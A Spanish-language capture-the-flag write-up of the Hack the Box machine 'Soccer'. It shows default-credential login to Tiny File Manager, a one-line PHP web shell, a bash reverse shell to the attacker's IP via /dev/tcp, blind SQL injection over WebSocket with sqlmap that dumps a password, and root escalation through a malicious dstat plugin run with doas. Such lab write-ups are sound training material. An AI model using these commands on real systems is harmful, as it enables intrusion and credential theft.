---
title: Soccer WriteUp
date: 2023-07-03
categories: [WriteUps, Máquinas Linux]
tags: [WebSocket, SQLMap]
image:
  path: ../../assets/img/writeups/Soccer/soccer.jpg
  width: 528
  height: 340
  alt: Banner Soccer
---

## Reconocimiento

Hoy nos enfrentaremos a la máquina Soccer, máquina de la plataforma Hack the Box, como todas las que hago por el momento. La box Soccer tiene la siguiente ip `10.10.11.194`. Comprobamos si tenemos conectividad:
```sh
> ping -c 1 10.10.11.194
PING 10.10.11.194 (10.10.11.194) 56(84) bytes of data.
64 bytes from 10.10.11.194: icmp_seq=1 ttl=63 time=45.9 ms

--- 10.10.11.194 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 45.889/45.889/45.889/0.000 ms
```
Un paquete envíado, un paquete recibido. Todo bien.

Realizamos un escaneo con nmap para visualizar puertos abiertos:
```sh
> nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.11.194

# Nmap 7.92 scan initiated Sun Dec 25 17:49:54 2022 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.11.194
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.194 ()	Status: Up
Host: 10.10.11.194 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 9091/open/tcp//xmltec-xmlmail///
# Nmap done at Sun Dec 25 17:50:07 2022 -- 1 IP address (1 host up) scanned in 12.82 seconds
```
Las opciones que he utilizado son:

* -p- : Escanea todos los puertos. Hay un total de 65535 puertos
* --open : Muestra únicamente los puertos abiertos.
* -sS : Realiza un TCP SYN Scan
* --min-rate 5000 : Para enviar paquetes no más lentos que 5000 paquetes por segundo
* -vvv : Muestra la información en pantalla mientras se realiza el escaneo
* -n : Para no aplicar resolución DNS
* -Pn : Para que no aplique el protocolo ARP
* 10.10.11.194 : Dirección IP objetivo, la cual quiero escanear
* -oG allPorts : Exportará el output a un fichero grepeable que llamaremos "allPorts"

Con estos puertos intentaremos sacar algo más de información:
```sh
> nmap -p22,80,9091 -sC -sV 10.10.11.194 -oN targeted

# Nmap 7.92 scan initiated Sun Dec 25 17:50:48 2022 as: nmap -p22,80,9091 -sCV -oN targeted 10.10.11.194
Nmap scan report for 10.10.11.194
Host is up (0.043s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close   
--skip--
```

Tenemos abiertos los puertos 22/ssh, 80/http y 9091 que parece un servicio de mail.

## Buscando vulnerabilidades

Antes de nada, en el anterior escaneo encontramos el dominio **soccer.htb**, hay que meterlo en el /etc/hosts para que al poner su ip nos direccione a ese dominio, ya que podríamos estar ante un virtual hosting.
```sh
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot

10.10.11.194  soccer.htb
```
Usaré la herramienta whatweb para comprobar que tecnologías corren por detrás de la web, y ya de paso del puerto 9091 a ver que sale:
```sh
> whatweb http://10.10.11.194
http://10.10.11.194 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.194], RedirectLocation[http://soccer.htb/], Title[301 Moved Permanently], nginx[1.18.0]
http://soccer.htb/ [200 OK] Bootstrap[4.1.1], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.194], JQuery[3.2.1,3.6.0], Script, Title[Soccer - Index], X-UA-Compatible[IE=edge], nginx[1.18.0]
> whatweb http://10.10.11.194:9091
http://10.10.11.194:9091 [404 Not Found] Country[RESERVED][ZZ], HTML5, IP[10.10.11.194], Title[Error], UncommonHeaders[content-security-policy,x-content-type-options]
```
Por el puerto 80 te redirige al dominio soccer.htb. Por el puerto 9091 no hay nada.

Antes de entrar al navegador voy a realizar un fuzzing de subdominios con gobuster:
```sh
> gobuster vhost -u http://soccer.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -t 20

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://soccer.htb
[+] Method:       GET
[+] Threads:      20
[+] Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/07/03 09:14:24 Starting gobuster in VHOST enumeration mode
===============================================================
                                
===============================================================
2023/07/03 09:15:10 Finished
```
No encuentra ningún subdominio con el diccionario utilizado. Veamos que pinta tiene la web:

![Web]({{ 'assets/img/writeups/Soccer/web.png' | relative_url }}){: .center-image }

En el código fuente de la página no veo nada interesante. Rearlizaré un fuzzing de subdirectorios:
```sh
> ffuf -c -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://soccer.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soccer.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

# directory-list-2.3-medium.txt [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 46ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 47ms]
Duration: 49ms]
                        [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 58ms]
#                       [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 58ms]
# Priority ordered case-sensitive list, where entries were found [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 59ms]
#                       [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 60ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 47ms]
tiny                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 42ms]
```
Nos ha sacado el subdirectorio **tiny**. Entramos:

![Tiny]({{ 'assets/img/writeups/Soccer/tiny.png' | relative_url }}){: .center-image }

Nos encontramos ante un panel login donde pone arriba "Tiny File Manager". Puede que sea un programa existente con vulnerabilidades conocidas o credenciales por defecto, así que investigamos un poco.

```sh
> searchsploit tiny file manager

Tiny File Manager 2.4.6 - Remote Code Execution (RCE)        | php/webapps/50828.sh
```
Encuentro un RCE pero tiene que ser para esa versión y tengo que estar autenticado.

Buscaré credenciales por defecto de este servicio. Encuentro esto;  
Default username/password: **admin/admin@123** and user/12345.

Probando la segunda, user:12345 consigo entrar al panel.

![TinyDentro]({{ 'assets/img/writeups/Soccer/tinyDentro.png' | relative_url }}){: .center-image }

La versión, no se ve en la foto, pero está abajo a la derecha y es la **2.4.3**.

Aparte de las imagenes hay una carpea llamada tiny y dentro de ella la carpeta uploads. Así que deduzco que hay dos lugares donde se pueden llegar a subir archivos; en /var/www/html - si haces hoovering en el dibujo de la casa sale esa ruta - y en /var/www/html/tiny/uploads.

El exploit encontrado pertenece a una versión posterior y quizás pueda funcionar pero de momento voy a investigar por mi cuenta. Realizaré un fuzzing sobre este directorio tiny, estaría bien encontrar un recurso de subida de archivos.
```sh
> gobuster dir -u http://soccer.htb/tiny/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soccer.htb/tiny/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/07/03 10:17:46 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/uploads/]
Progress: 11302 / 441122 (58%)
```
Igual no puedo subir archivos porue me he logeado con el de user en vez de con el de admin.. que soy un espabilao. Salgo de la cuenta y pruebo a logearme con la otra credencial por defecto que encontré por internet: admin/admin@123

Ahora si que veo una opción de subida de archivos. Subo este archivo:
```php
<?php system($_REQUEST['cmd']); ?>
```
Me meto a la carpeta /tiny/uploads y le doy a upload desde ese punto, si lo subes en /var/www/html no funciona. Y ahora llamo al php y ejecuto comando:

![RCE]({{ 'assets/img/writeups/Soccer/rce.png' | relative_url }}){: .center-image }

Cada pocos minutos el archivo subido se elimina. Tendrás que subirlo otra vez y ya está.  
Comprobaré que tengo conectividad a mi máquina desde el rce, en la url:
```
http://soccer.htb/tiny/uploads/pwned.php?cmd=ping -c 1 10.10.14.7
```
Y estando en escucha recibo el ping:
```sh
tcpdump -i tun0 icmp -n

tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
08:16:34.865139 IP 10.10.11.194 > 10.10.14.7: ICMP echo request, id 2, seq 1, length 64
08:16:34.865168 IP 10.10.14.7 > 10.10.11.194: ICMP echo reply, id 2, seq 1, length 64
```
Me lanzaré una reverse, en mi consola me pongo en escucha por el puerto 443 por ejemplo; `nc -nlvp 443` y ahora desde la url: 
```
http://soccer.htb/tiny/uploads/pwned.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1'
```
Y recibo la consola:
```sh
> nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.11.194] 55550
bash: cannot set terminal process group (1046): Inappropriate ioctl for device
bash: no job control in this shell
www-data@soccer:~/html/tiny/uploads$ whoami
whoami
www-data
```
Toca hacer el tratamiento de la tty:
```sh
www-data@soccer:~/html/tiny/uploads$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@soccer:~/html/tiny/uploads$ ^Z
zsh: suspended  nc -nlvp 443
```
Sale a mi terminal local:
```sh
stty raw -echo; fg
    reset xterm
```
Volvemos a terminal objetivo:
```sh
www-data@soccer:~/html/tiny/uploads$ export TERM=xterm
www-data@soccer:~/html/tiny/uploads$ export SHELL=bash
www-data@soccer:~/html/tiny/uploads$ stty rows 38 columns 184
# Cada ordenador tendrá su número de filas y columnas para averiguarlo; stty size
```
```sh
www-data@soccer:/$ cd /home
www-data@soccer:/home$ ls
player
www-data@soccer:/home$ cd player
www-data@soccer:/home/player$ ls -la
total 28
drwxr-xr-x 3 player player 4096 Nov 28  2022 .
drwxr-xr-x 3 root   root   4096 Nov 17  2022 ..
lrwxrwxrwx 1 root   root      9 Nov 17  2022 .bash_history -> /dev/null
-rw-r--r-- 1 player player  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 player player 3771 Feb 25  2020 .bashrc
drwx------ 2 player player 4096 Nov 17  2022 .cache
-rw-r--r-- 1 player player  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root   root      9 Nov 17  2022 .viminfo -> /dev/null
-rw-r----- 1 root   player   33 Jul  4 06:05 user.txt
www-data@soccer:/home/player$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@soccer:/home/player$ cat user.txt
cat: /home/player/user.txt: Permission denied
```

## Escalada de priviegios

Somos el usuario www-data, tendremos que escalar al usuario player y luego escalar a root. Si se pudiera subir a root directo perfecto, pero no suele ser el caso, las máquinas están pensadas para que sea una escalada progresiva. Empezemos revisando lo típico:
```sh
www-data@soccer:/home/player$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@soccer:/home/player$ sudo -l
[sudo] password for www-data: 
# No cuento con contraseña
www-data@soccer:/home/player$ find / \-perm -4000 2>/dev/null
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/at
/snap/snapd/17883/usr/lib/snapd/snap-confine
-- skip -- # Era más de snap
www-data@soccer:/home/player$ getcap -r 2>/dev/null
# Sin resultados
```
```sh
www-data@soccer:/$ find -name \*config\* 2>/dev/null | xargs cat 2>/dev/null | grep -iE "passwd|password" | wc -l
20
www-data@soccer:/$ find -name \*config\* 2>/dev/null | xargs cat 2>/dev/null | grep -iE "passwd|password"        
syn keyword sshdconfigRootLogin prohibit-password without-password forced-commands-only
syn keyword sshdconfigRootLogin prohibit-password without-password forced-commands-only
syn keyword sshdconfigKeyword KerberosOrLocalPasswd
syn keyword sshdconfigKeyword PasswordAuthentication
syn keyword sshdconfigKeyword PermitEmptyPasswords
syn keyword sshconfigPreferredAuth hostbased publickey password gssapi-with-mic
syn keyword sshconfigKeyword NumberOfPasswordPrompts
syn keyword sshconfigKeyword PasswordAuthentication
Binary file (standard input) matches
```
Como no veo nada de nada voy a pasarme el linpeas de mi máquina al objetivo, desde local:
```sh
> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Y desde objetivo:
```sh
www-data@soccer:/tmp$ wget http://10.10.14.7/linpeas.sh
--2023-07-04 07:59:18--  http://10.10.14.7/linpeas.sh
Connecting to 10.10.14.7:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828087 (809K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh                                    100%[==========================================================================>] 808.68K  1.74MB/s    in 0.5s    

2023-07-04 07:59:19 (1.74 MB/s) - 'linpeas.sh' saved [828087/828087]

www-data@soccer:/tmp$ chmod +x linpeas.sh
www-data@soccer:/tmp$ ./linpeas.sh
-- skip --
# Sale muuucha información, pero me quedo con esto:

lrwxrwxrwx 1 root root 41 Nov 17  2022 /etc/nginx/sites-enabled/soc-player.htb -> /etc/nginx/sites-available/soc-player.htb
server {
	listen 80;
	listen [::]:80;
	server_name soc-player.soccer.htb;
	root /root/app/views;
	location / {
		proxy_pass http://localhost:3000;
		proxy_http_version 1.1;
```
Tenemos un nuevo subdominio; **soc-player.soccer.htb**. Parece que escucha por el puerto 80 de la máquina, a través de virtual hostint. Y pasa por un proxy en el puerto 3000 de la máquina si no lo entiendo mal. Añado ese dominio al /etc/hosts:
```sh
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot

10.10.11.194  soccer.htb  soc-player.soccer.htb
```
Y me meto al navegador.

![NewDominio]({{ 'assets/img/writeups/Soccer/nuevoDominio.png' | relative_url }}){: .center-image }

Parece igual pero no, cambia lo marcado en rojo, antes no estaba.

Nos registramos y luego nos logueamos. Parece que hay un sistema de tickets. Quiero interceptar la petición para probar cosillas y ver la petición claro, así que inciamos burpsuite.

Intercepto una petición recargando página de check(tickets) --> En burpsuite; Forward, Intercept is off --> http history verás que mandando mas números no llega nada, pero en WebSocket History si:

![WebSocket]({{ 'assets/img/writeups/Soccer/webSocket.png' | relative_url }}){: .center-image }

> **¿Qué es WebSocket?**  
WebSocket es una tecnología que proporciona un canal de comunicación bidireccional y full-duplex sobre un único socket TCP. Está diseñada para ser implementada en navegadores y servidores web, pero puede utilizarse por cualquier aplicación cliente/servidor.

Pruebo inyecciones básicas en el ticket y parecen funcionar:
```sh
4 or 1=1-- -
# Me pone que ticket existe

4 or sleep(5)-- -
# Tarda 5 segundos en responder, lo puedo ver desde el WebSocket History.
```
Voy a lanzar un **sqlmap** esta vez:
```sh
> sqlmap -u ws://soc-player.soccer.htb:9091/ --data '{"id":"4"}' --batch --dbs --threads=10 -dbms=mysql

Parameter: JSON id ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"id":"4 AND (SELECT 1818 FROM (SELECT(SLEEP(5)))hpIn)"}
# Es una inyección basada en tiempo.

available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys
```
La base de datos más interesante es soccer_db:
```sh
> sqlmap -u ws://soc-player.soccer.htb:9091/ --data '{"id":"4"}' --batch -D soccer_db --tables --threads=10

Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+
```
Ahora toca averiguar las columnas:
```sh
> sqlmap -u ws://soc-player.soccer.htb:9091/ --data '{"id":"4"}' --batch -D soccer_db -T accounts --columns --threads=10

Database: soccer_db
Table: accounts
[4 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| email    | varchar(40) |
| id       | int         |
| password | varchar(40) |
| username | varchar(40) |
+----------+-------------+
```
Y por último dumpear la data:
```sh
> sqlmap -u ws://soc-player.soccer.htb:9091/ --data '{"id":"4"}' --batch -D soccer_db -T accounts -C username,password --dump --threads=10

Database: soccer_db
Table: accounts
[1 entry]
+----------+----------------------+
| username | password             |
+----------+----------------------+
| player   | PlayerOftheMatch2022 |
+----------+----------------------+
```
Quizás estas credenciales las podeams usar para escalar al usuario player. Podría hacer un `su player` ya que estoy dentro de máquina objetivo pero voy a probar a conectarme por ssh:
```sh
ssh player@10.10.11.194
--skip--

player@soccer:~$ whoami
player
player@soccer:~$ hostname -I
10.10.11.194 dead:beef::250:56ff:feb9:f50d
```

## Escalada a root

```sh
player@soccer:~$ export TERM=xterm

player@soccer:~$ sudo -l
[sudo] password for player: 
Sorry, user player may not run sudo on localhost.

player@soccer:~$ find / \-perm -4000 2>/dev/null
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/at
```
En este punto encuentro un comando con suid que no es normal, es el comando doas. Si acudo a [gftobins](https://gtfobins.github.io/) no encuentro nada con doas. Pero realmente si que puede ser vulnerable. Lo primero es ir al archivo de configuración del comando doas.
> El comando doas te permite ejecutar como otro usuario un comando. En su archivo de configuración suelen salir los comandos con los que puedes hacerlo y como que usuario.

El archivo de configuración se llada doas.conf:
```sh
player@soccer:~$ find / -name doas.conf 2>/dev/null
/usr/local/etc/doas.conf
player@soccer:~$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
```
Puedo ejecutar el comando dstat como el usuario root, como si de un sudo se tratara. Buscaré en la misma página de antes -gtfobins- el comando dstat. Y tengo algo, para sudo:
```
echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
sudo dstat --xxx
```
Está creando un script en python y lo esta llamando dstat_xxx.py, luego lo ejecuta como --xxx, entiendo que es una operativa especial del comando dstat.

> Dstat nos permite monitorear los recursos del sistema en tiempo real. La vulnerabilidad en el comando se produce porque permite correr scripts arbitrarios en python cargados como plugins externos.

Desde el home de player ejecuto los comandos encontramos en gtfobins:
```sh
player@soccer:~$ echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py
player@soccer:~$ dstat --xxx
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
$ whoami
player
``` 
Se me olvidó que lo tengo que ejectuar con el doas..que es realmente el comando que me permite ejecutar el comando dstat como root, vuelvo a hacerlo:
```sh
player@soccer:~$ doas dstat --xxx
doas: Operation not permitted
# Como veréis pongo también los fallos.

player@soccer:~$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
player@soccer:~$ doas /usr/bin/dstat --xxx
dstat: option --xxx not recognized, try dstat -h for a list of all the options

player@soccer:~$ echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_zzz.py
player@soccer:~$ doas /usr/bin/dstat --zzz
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
# whoami
root
# cat /root/root.txt
c5e678cd6ac0fdf8ef9ad7**********
# Pensé que quizás al ser utilizado antes ese dstat_xxx.py por mi ya no se podía usar como script y lo cambié por zzz.
```
Máquina chula. Se aprende con lo del comando doas. El subdominio que había que encontrar para llegar al usuario player pues bueeeno, había que buscar bien.